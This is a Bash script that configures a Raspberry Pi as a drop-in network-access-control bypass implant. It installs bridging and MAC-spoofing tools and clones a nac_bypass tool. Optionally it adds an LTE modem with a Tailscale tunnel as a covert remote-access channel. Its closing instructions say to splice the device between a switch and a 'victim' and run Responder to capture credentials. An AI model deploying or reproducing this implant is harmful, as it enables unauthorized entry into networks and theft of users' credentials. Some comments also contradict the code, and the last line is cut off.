#!/bin/bash

# This script automates the setup of a Raspberry Pi 4 for NAC bypassing
# based on the guide from https://luemmelsec.github.io/I-got-99-problems-but-my-NAC-aint-one/

# ANSI Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD='\033[1m'

# Emojis
SUCCESS_EMOJI="✅"
ERROR_EMOJI="❌"
WARNING_EMOJI="⚠️"
INFO_EMOJI="ℹ️"
STEP_EMOJI="➡️"

# Function to display error messages and exit
error_exit() {
    echo -e "${ERROR_EMOJI} ${RED}Error: $1${RESET}" >&2
    exit 1
}

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
    error_exit "This script must be run as root. Please use 'sudo'."
fi

echo -e "${BOLD}${CYAN}Welcome to the Raspberry Pi NAC Bypass and LTE Setup Script!${RESET}"
echo -e "${CYAN}----------------------------------------------------------------------------------${RESET}"

# The rest of your script remains the same from here on.
# ... (rest of your script)
# --- User Input for LTE Module Setup Option ---
echo -e "\n${INFO_EMOJI} ${BLUE}Do you want to set up the Huawei LTE connection service? (y/n): ${RESET}"
read -p "Enter 'y' or 'n': " -n 1 -r INSTALL_LTE_MODULE_CHOICE
echo
INSTALL_LTE_MODULE_CHOICE=${INSTALL_LTE_MODULE_CHOICE,,} # Convert to lowercase
if [[ "$INSTALL_LTE_MODULE_CHOICE" == "y" ]]; then
    INSTALL_LTE_MODULE=true
    # --- User Input for LTE Service Username ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Please provide the username for the Huawei LTE connection service:${RESET}"
    read -p "Enter the username (e.g., pi, yourusername): " LTE_USERNAME
    if [ -z "$LTE_USERNAME" ]; then
        error_exit "LTE service username cannot be empty."
    fi
    if ! id "$LTE_USERNAME" &>/dev/null; then
        error_exit "User '$LTE_USERNAME' does not exist. Please create the user or provide an existing one."
    fi

    # --- User Input for Huawei LTE Password and SIM PIN ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Please provide details for your Huawei LTE Modem:${RESET}"
    read -s -p "Enter the Huawei LTE Modem Password (leave empty for default): " HUAWEI_MODEM_PASSWORD
    echo
    read -p "Enter the SIM Card PIN (required for connection): " SIM_PIN
    if [ -z "$SIM_PIN" ]; then
        error_exit "SIM Card PIN cannot be empty if setting up LTE."
    fi

    # --- User Input for Tailscale VPN Setup Option ---
    echo -e "\n${INFO_EMOJI} ${BLUE}Do you want to set up an automatic Tailscale VPN connection? (y/n): ${RESET}"
    read -p "Enter 'y' or 'n': " -n 1 -r INSTALL_TAILSCALE_CHOICE
    echo
    INSTALL_TAILSCALE_CHOICE=${INSTALL_TAILSCALE_CHOICE,,} # Convert to lowercase
    if [[ "$INSTALL_TAILSCALE_CHOICE" == "y" ]]; then
        INSTALL_TAILSCALE=true
        echo -e "\n${INFO_EMOJI} ${BLUE}Please provide your Tailscale auth key:${RESET}"
        read -p "Enter Tailscale auth key: " TAILSCALE_AUTHKEY
        if [ -z "$TAILSCALE_AUTHKEY" ]; then
            error_exit "Tailscale auth key cannot be empty."
        fi
        echo -e "${SUCCESS_EMOJI} ${GREEN}Tailscale setup completed successfully.${RESET}"
    else
        INSTALL_TAILSCALE=false
        echo -e "${INFO_EMOJI} ${BLUE}Skipping Tailscale VPN setup.${RESET}"
    fi

else
    INSTALL_LTE_MODULE=false
    INSTALL_TAILSCALE=false # If no LTE, no WireGuard
    echo -e "${INFO_EMOJI} ${BLUE}Skipping Huawei LTE connection service setup and Tailscale VPN setup.${RESET}"
fi


echo -e "\n${BOLD}${CYAN}--- Starting installation and configuration ---${RESET}\n"

# --- Step 7.1: Configure eth1 for DHCP using /etc/network/interfaces.d/ ---
echo -e "${STEP_EMOJI} ${BLUE}7.1. Configuring eth1 for DHCP using /etc/network/interfaces.d/...${RESET}"
INTERFACES_D_DIR="/etc/network/interfaces.d"
mkdir -p "$INTERFACES_D_DIR" || error_exit "Failed to create $INTERFACES_D_DIR."
ETH1_CONF="$INTERFACES_D_DIR/eth1"

cat <<EOL > "$ETH1_CONF"
auto eth1
    allow-hotplug eth1
    iface eth1 inet dhcp
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $ETH1_CONF."; fi
echo -e "     ${SUCCESS_EMOJI} ${GREEN}$ETH1_CONF created for DHCP.${RESET}"
echo -e "     ${WARNING_EMOJI} ${YELLOW}Note: You are configuring 'eth1' using '/etc/network/interfaces.d/' while 'wlan0' is managed by 'systemd-networkd'. This is a hybrid setup and requires a reboot to take full effect for 'eth1'. Ensure NetworkManager is disabled to avoid conflicts.${RESET}\n"

# --- Step 7.2: Configure eth0 for hotplug (no IP) using /etc/network/interfaces.d/ ---
echo -e "${STEP_EMOJI} ${BLUE}7.2. Configuring eth0 for hotplug (no IP assigned) using /etc/network/interfaces.d/...${RESET}"
ETH0_CONF="$INTERFACES_D_DIR/eth0"

cat <<EOL > "$ETH0_CONF"
auto eth0
    allow-hotplug eth0
    iface eth0 inet dhcp
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $ETH0_CONF."; fi
echo -e "     ${SUCCESS_EMOJI} ${GREEN}$ETH0_CONF created for hotplug, no IP assigned.${RESET}\n"

# --- Step 7.3: Configure usb0 LTE for hotplug (no IP) using /etc/network/interfaces.d/ ---
echo -e "${STEP_EMOJI} ${BLUE}7.3. Configuring usb0 for DHCP using /etc/network/interfaces.d/...${RESET}"
USB0_CONF="$INTERFACES_D_DIR/usb0"

cat <<EOL > "$USB0_CONF"
auto usb0
    allow-hotplug usb0
    iface usb0 inet dhcp
EOL
if [ $? -ne 0 ]; then error_exit "Failed to write $USB0_CONF."; fi
echo -e "     ${SUCCESS_EMOJI} ${GREEN}$USB0_CONF created for DHCP.${RESET}"
echo -e "     ${WARNING_EMOJI} ${YELLOW}Note: 'usb0' is configured via '/etc/network/interfaces.d/'. Ensure NetworkManager is disabled to avoid conflicts and a reboot is required for changes to take full effect.${RESET}\n"

# --- Step 8: Reload systemd, enable, and restart services ---
# Adjusted numbering from previous step
echo -e "${STEP_EMOJI} ${BLUE}8. Reloading systemd daemon, enabling and restarting services...${RESET}"
# Remove systemd-networkd-wait-online override here, in case it was applied previously
# This is relevant because we're moving to a more specific internet connectivity check.
if [ -f "/etc/systemd/system/systemd-networkd-wait-online.service.d/override.conf" ]; then
    echo -e "    ${INFO_EMOJI} ${BLUE}Removing previous systemd-networkd-wait-online override...${RESET}"
    rm /etc/systemd/system/systemd-networkd-wait-online.service.d/override.conf
    rmdir /etc/systemd/system/systemd-networkd-wait-online.service.d/ 2>/dev/null # Remove dir if empty
    systemctl daemon-reload # Reload after removal
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}systemd-networkd-wait-online override removed.${RESET}"
fi

systemctl daemon-reload || error_exit "Failed to reload systemd daemon."

# Disable network manager as it mangles with hostapd and causes IEEE 802.11: disassociated
sudo systemctl disable NetworkManager || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to disable NetworkManager. Check logs after reboot.${RESET}"
echo -e "${SUCCESS_EMOJI} ${GREEN}Services reloaded and restarted (if possible).${RESET}\n"

# --- Step 11: Install and configure nac_bypass ---
echo -e "${STEP_EMOJI} ${BLUE}11. Installing and configuring nac_bypass tool...${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.1. Installing nac_bypass dependencies...${RESET}"
apt-get install -y bridge-utils ethtool macchanger arptables ebtables iptables net-tools tcpdump git || error_exit "Failed to install nac_bypass dependencies."
echo -e "    ${SUCCESS_EMOJI} ${GREEN}nac_bypass dependencies installed.${RESET}"

echo -e "    ${STEP_EMOJI} ${BLUE}11.2. Ensuring legacy iptables, arptables, and ebtables are used...${RESET}"
update-alternatives --set iptables /usr/sbin/iptables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set iptables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set ip6tables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set arptables /usr/sbin/arptables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set arptables to legacy. Manual intervention may be needed.${RESET}"
update-alternatives --set ebtables /usr/sbin/ebtables-legacy || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set ebtables to legacy. Manual intervention may be needed.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Legacy netfilter tools configured.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.3. Loading kernel module br_netfilter...${RESET}"
modprobe br_netfilter
if ! lsmod | grep -q br_netfilter; then
    echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: br_netfilter module not loaded. Manual intervention may be needed.${RESET}"
else
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}br_netfilter module loaded.${RESET}"
fi

echo -e "    ${INFO_EMOJI} ${BLUE}11.4. Appending br_netfilter to /etc/modules...${RESET}"
if ! grep -q "br_netfilter" /etc/modules; then
    echo "br_netfilter" | tee -a /etc/modules || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to append br_netfilter to /etc/modules.${RESET}"
else
    echo -e "    ${INFO_EMOJI} ${BLUE}br_netfilter already in /etc/modules.${RESET}"
fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}br_netfilter configuration complete.${RESET}"

# --- Added Step: Add root cronjob to ensure br_netfilter module is loaded ---
apt-get install -y cron || error_exit "Failed to install cron for cronjob mgmt."
echo -e "    ${STEP_EMOJI} ${BLUE}11.5. Adding root cronjob to ensure br_netfilter module is loaded on reboot...${RESET}"
(crontab -l -u root 2>/dev/null | grep -v 'modprobe br_netfilter' ; echo "@reboot /sbin/modprobe br_netfilter") | crontab -u root -
if [ $? -ne 0 ]; then error_exit "Failed to add root cronjob for br_netfilter."; fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Root cronjob for br_netfilter added.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.6. Enabling IP forwarding in /etc/sysctl.conf...${RESET}"
SYSCTL_CONF="/etc/sysctl.conf"
if ! grep -q "^net.ipv4.ip_forward = 1" "$SYSCTL_CONF"; then
    echo "net.ipv4.ip_forward = 1" >> "$SYSCTL_CONF"
    echo -e "    ${INFO_EMOJI} ${BLUE}net.ipv4.ip_forward = 1 added to $SYSCTL_CONF.${RESET}"
else
    sed -i 's/^#net.ipv4.ip_forward = 1/net.ipv4.ip_forward = 1/' "$SYSCTL_CONF"
    echo -e "    ${INFO_EMOJI} ${BLUE}net.ipv4.ip_forward = 1 uncommented or ensured in $SYSCTL_CONF.${RESET}"
fi
sysctl -p || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to apply sysctl changes immediately. Reboot will apply.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}IP forwarding enabled.${RESET}"


echo -e "    ${INFO_EMOJI} ${BLUE}11.7. Cloning nac_bypass repository...${RESET}"
NAC_BYPASS_DIR="$HOME/nac_bypass"
if [ -d "$NAC_BYPASS_DIR" ]; then
    echo -e "    ${INFO_EMOJI} ${BLUE}$NAC_BYPASS_DIR already exists. Pulling latest changes...${RESET}"
    (cd "$NAC_BYPASS_DIR" && git pull) || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to pull latest changes for nac_bypass.${RESET}"
else
    git clone https://github.com/haha150/nac_bypass "$NAC_BYPASS_DIR" || error_exit "Failed to clone nac_bypass repository."
fi
echo -e "    ${SUCCESS_EMOJI} ${GREEN}nac_bypass repository cloned/updated.${RESET}"

echo -e "    ${INFO_EMOJI} ${BLUE}11.8. Setting permissions for nac_bypass_setup.sh...${RESET}"
chmod +x "$NAC_BYPASS_DIR/nac_bypass_setup.sh" || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set executable permissions for nac_bypass_setup.sh.${RESET}"
echo -e "    ${SUCCESS_EMOJI} ${GREEN}Permissions set for nac_bypass_setup.sh.${RESET}\n"

# --- Step 12: Install and configure Huawei LTE Connect Service (Optional) ---
if [ "$INSTALL_LTE_MODULE" = true ]; then
    echo -e "${STEP_EMOJI} ${BLUE}12. Installing and configuring Huawei LTE Connect Service...${RESET}"

    HUAWEI_HILINK_DIR="/home/$LTE_USERNAME/huawei_hilink_api" # Use provided username for home directory

    echo -e "    ${INFO_EMOJI} ${BLUE}12.1. Cloning huawei_hilink_api repository...${RESET}"
    if [ -d "$HUAWEI_HILINK_DIR" ]; then
        echo -e "    ${INFO_EMOJI} ${BLUE}$HUAWEI_HILINK_DIR already exists. Pulling latest changes...${RESET}"
        (cd "$HUAWEI_HILINK_DIR" && git pull) || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to pull latest changes for huawei_hilink_api.${RESET}"
    else
        # Ensure the parent directory exists before cloning
        mkdir -p "/home/$LTE_USERNAME" || error_exit "Failed to create /home/$LTE_USERNAME directory."
        git clone https://github.com/haha150/huawei_hilink_api "$HUAWEI_HILINK_DIR" || error_exit "Failed to clone huawei_hilink_api repository."
        chown -R "$LTE_USERNAME":"$LTE_USERNAME" "$HUAWEI_HILINK_DIR" # Set ownership
    fi
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}huawei_hilink_api repository cloned/updated.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.2. Configuring example_huawei_hilink.sh with provided credentials and absolute path...${RESET}"
    EXAMPLE_SCRIPT="$HUAWEI_HILINK_DIR/example_huawei_hilink.sh"
    if [ ! -f "$EXAMPLE_SCRIPT" ]; then
        error_exit "example_huawei_hilink.sh not found in $HUAWEI_HILINK_DIR."
    fi

    # Escape password and PIN for sed
    ESCAPED_HUAWEI_MODEM_PASSWORD=$(printf '%s\n' "$HUAWEI_MODEM_PASSWORD" | sed -e 's/[\/&]/\\&/g')
    ESCAPED_SIM_PIN=$(printf '%s\n' "$SIM_PIN" | sed -e 's/[\/&]/\\&/g')

    # Replace hilink_password and hilink_pin in the script, ensuring overwrite
    sed -i -E "s/^(hilink_password=\")[^\"]*(\")/\1$ESCAPED_HUAWEI_MODEM_PASSWORD\2/" "$EXAMPLE_SCRIPT" || error_exit "Failed to set hilink_password in example_huawei_hilink.sh."
    sed -i -E "s/^(hilink_pin=\")[^\"]*(\")/\1$ESCAPED_SIM_PIN\2/" "$EXAMPLE_SCRIPT" || error_exit "Failed to set hilink_pin in example_huawei_hilink.sh."

    # Replace the relative source path with the absolute path
    sed -i "s|^source huawei_hilink_api.sh|source $HUAWEI_HILINK_DIR/huawei_hilink_api.sh|" "$EXAMPLE_SCRIPT" || error_exit "Failed to set absolute source path in example_huawei_hilink.sh."

    # Ensure the script is executable
    chmod +x "$EXAMPLE_SCRIPT" || echo -e "    ${WARNING_EMOJI} ${YELLOW}Warning: Failed to set executable permissions for $EXAMPLE_SCRIPT.${RESET}"
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}example_huawei_hilink.sh configured.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.3. Creating systemd service for Huawei LTE connection...${RESET}"
    LTE_SERVICE_FILE="/etc/systemd/system/huawei-lte-connect.service"
    cat <<EOL > "$LTE_SERVICE_FILE"
[Unit]
Description=Start Huawei LTE connection
After=network.target

[Service]
Type=oneshot
ExecStartPre=/bin/sleep 60
ExecStart=/bin/bash /home/${LTE_USERNAME}/huawei_hilink_api/example_huawei_hilink.sh on
ExecStop=/bin/bash /home/${LTE_USERNAME}/huawei_hilink_api/example_huawei_hilink.sh off
User=${LTE_USERNAME}
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOL
    if [ $? -ne 0 ]; then error_exit "Failed to write $LTE_SERVICE_FILE."; fi
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}$LTE_SERVICE_FILE created.${RESET}"

    echo -e "    ${INFO_EMOJI} ${BLUE}12.4. Reloading systemd daemon and enabling Huawei LTE service...${RESET}"
    systemctl daemon-reexec || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to re-execute systemd daemon. Reboot recommended.${RESET}"
    systemctl daemon-reload || error_exit "Failed to reload systemd daemon."
    systemctl enable huawei-lte-connect.service || echo -e "${WARNING_EMOJI} ${YELLOW}Warning: Failed to enable huawei-lte-connect.service. Check logs after reboot.${RESET}"
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}Huawei LTE service enabled.${RESET}\n"

    # --- Step 12.5: Create fix-lte-routing.sh script ---
    echo -e "${STEP_EMOJI} ${BLUE}12.5. Creating /root/fix-lte-routing.sh for specific route adjustments...${RESET}"
    FIX_LTE_ROUTING_SCRIPT="/root/fix-lte-routing.sh"
    cat <<'EOF_FIX_ROUTE' > "$FIX_LTE_ROUTING_SCRIPT"
#!/bin/bash

# Route private class ips through bridge interface
ip route add 10.0.0.0/8 via 169.254.66.1 dev br0 || true
ip route add 172.16.0.0/12 via 169.254.66.1 dev br0 || true
ip route add 192.168.0.0/16 via 169.254.66.1 dev br0 || true

# Remove default route by nac_bypass.sh (if it exists)
ip route del default via 169.254.66.1 dev br0 || true
EOF_FIX_ROUTE
    if [ $? -ne 0 ]; then error_exit "Failed to write $FIX_LTE_ROUTING_SCRIPT."; fi

    chmod +x "$FIX_LTE_ROUTING_SCRIPT" || error_exit "Failed to set executable permissions for $FIX_LTE_ROUTING_SCRIPT."
    echo -e "    ${SUCCESS_EMOJI} ${GREEN}$FIX_LTE_ROUTING_SCRIPT created and made executable.${RESET}\n"

    # --- Step 13: Install and Configure WireGuard VPN (Optional) ---
    if [ "$INSTALL_TAILSCALE" = true ]; then
        echo -e "${STEP_EMOJI} ${BLUE}13. Installing and configuring Tailscale VPN...${RESET}"
        
        curl -fsSL https://tailscale.com/install.sh | sh || error_exit "Failed to install Tailscale."

        # --- Create systemd drop-in so Tailscale waits for LTE connection ---
        echo -e "    ${INFO_EMOJI} ${BLUE}Creating systemd drop-in for tailscaled to wait for LTE...${RESET}"
        TAILSCALE_DROPIN_DIR="/etc/systemd/system/tailscaled.service.d"
        TAILSCALE_DROPIN_FILE="$TAILSCALE_DROPIN_DIR/wait-for-lte.conf"
        mkdir -p "$TAILSCALE_DROPIN_DIR" || error_exit "Failed to create drop-in directory."

        cat <<EOL > "$TAILSCALE_DROPIN_FILE"
[Unit]
After=huawei-lte-connect.service
Requires=huawei-lte-connect.service

[Service]
# Wait for LTE internet connectivity before starting tailscaled
ExecStartPre=/bin/bash -c 'echo "Waiting for internet on usb0..."; while ! ping -c 1 -I usb0 -W 3 8.8.8.8 >/dev/null 2>&1; do echo "usb0 not online yet, retrying in 5s..."; sleep 5; done; echo "usb0 is online, starting Tailscale."'
EOL

        if [ $? -ne 0 ]; then error_exit "Failed to write $TAILSCALE_DROPIN_FILE."; fi
        echo -e "    ${SUCCESS_EMOJI} ${GREEN}$TAILSCALE_DROPIN_FILE created.${RESET}"

        systemctl daemon-reload || error_exit "Failed to reload systemd daemon."
        systemctl enable --now tailscaled || error_exit "Failed to enable and start tailscaled."

        # Run tailscale up with your key
        tailscale up --authkey "$TAILSCALE_AUTHKEY" || error_exit "Failed to bring up Tailscale."

        echo -e "    ${SUCCESS_EMOJI} ${GREEN}Tailscale setup completed successfully.${RESET}\n"
    else
        echo -e "${INFO_EMOJI} ${BLUE}Skipping Tailscale VPN setup as requested.${RESET}\n"
    fi
else
    echo -e "${INFO_EMOJI} ${BLUE}Skipping LTE module setup and Tailscale VPN setup as requested. Steps 13 & 14 omitted.${RESET}\n"
fi # End of LTE module setup conditional block


echo -e "${BOLD}${GREEN}----------------------------------------------------------------${RESET}"
echo -e "${BOLD}${GREEN}Setup complete!${RESET}"
echo -e "${BOLD}${GREEN}----------------------------------------------------------------${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}Please reboot your Raspberry Pi for all changes to take full effect.${RESET}"

echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
echo -e "${BOLD}${CYAN}NAC Bypass Tool Information:${RESET}"
echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}The 'nac_bypass' tool has been installed in: ${BOLD}$NAC_BYPASS_DIR${RESET}"
echo -e "${INFO_EMOJI} ${BLUE}To use it, follow these steps after reboot and connecting the devices:${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}1. Connect the switch to eth0 (native LAN interface of RPi4).${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}2. Connect victim (e.g. printer) to eth1 (external USB LAN adapter).${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}3. Change directory to the nac_bypass tool:${RESET}"
echo -e "    ${MAGENTA}    cd ${BOLD}$NAC_BYPASS_DIR${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}4. Start the NAC bypass (replace eth0 and eth1 with your actual interface names if different):${RESET}"
echo -e "    ${MAGENTA}    sudo ./nac_bypass_setup.sh -1 eth0 -2 eth1 -S${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}The script will prompt you to wait. After it completes, you can proceed with your network scan.${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}Remember for Responder, you need to set it up to listen on the bridge interface (br0) and change the answering IP to the victim's IP:${RESET}"
echo -e "    ${MAGENTA}    ./Responder.py -I br0 -e victim.ip${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}You can inspect iptables rules with: ${BOLD}iptables -t nat -L${RESET}\n"

if [ "$INSTALL_LTE_MODULE" = true ]; then
    echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
    echo -e "${BOLD}${CYAN}Huawei LTE Connect Service Information:${RESET}"
    echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}The 'huawei_hilink_api' repository has been cloned to: ${BOLD}$HUAWEI_HILINK_DIR${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}The 'example_huawei_hilink.sh' script has been updated with your provided credentials and absolute paths.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}A systemd service named '${BOLD}huawei-lte-connect.service${RESET}${BLUE}' has been created to automatically start the LTE connection on boot.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}It will run the script '${BOLD}$HUAWEI_HILINK_DIR/example_huawei_hilink.sh on${RESET}${BLUE}' as user '${BOLD}${LTE_USERNAME}${RESET}${BLUE}'.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}After reboot, the LTE modem should attempt to connect automatically.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}You can check the service status with: ${BOLD}sudo systemctl status huawei-lte-connect.service${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}A routing fix script has been placed at '${BOLD}/root/fix-lte-routing.sh${RES}"
fi
